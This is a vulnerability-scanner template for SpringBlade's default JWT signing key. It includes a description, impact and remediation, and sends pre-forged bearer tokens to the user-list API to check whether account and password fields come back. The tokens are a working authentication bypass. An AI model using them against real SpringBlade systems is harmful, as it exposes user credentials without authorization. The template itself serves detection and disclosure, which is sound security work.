id: springblade-info-leak

info:
  name: SpringBlade 默认 SIGN_KEY 敏感信息泄露
  author: lbb
  severity: high
  description: |
    SpringBlade 框架使用默认 SIGN_KEY，攻击者可伪造 JWT 访问用户列表等接口，获取账号口令等敏感信息。
  impact: |
    Attackers using default SIGN_KEY can forge JWT tokens to obtain sensitive user information including account credentials, password hashes, and logs from the SpringBlade system.
  remediation: |
    Change the default SIGN_KEY to a strong, unique value in the SpringBlade configuration.
  reference:
    - https://github.com/chillzhuang/blade-tool
  metadata:
    max-request: 3
  tags: springblade,blade,info-leak,vuln

http:
  - raw:
      - |
        GET /api/blade-user/user-list HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: bearer {{bearer}}

    payloads:
      bearer:
        - 'eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9..gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk'
        - 'eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9..gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk'
        - 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..kol9scDVwLDE8U3mM_j8O4UYrpdUc9_Zw935g7Nb979DfRuanai1UeKsK2zCKuR77Otryi0sGzBfGANDbLseBg'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
          - '"account":'
          - '"password":'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
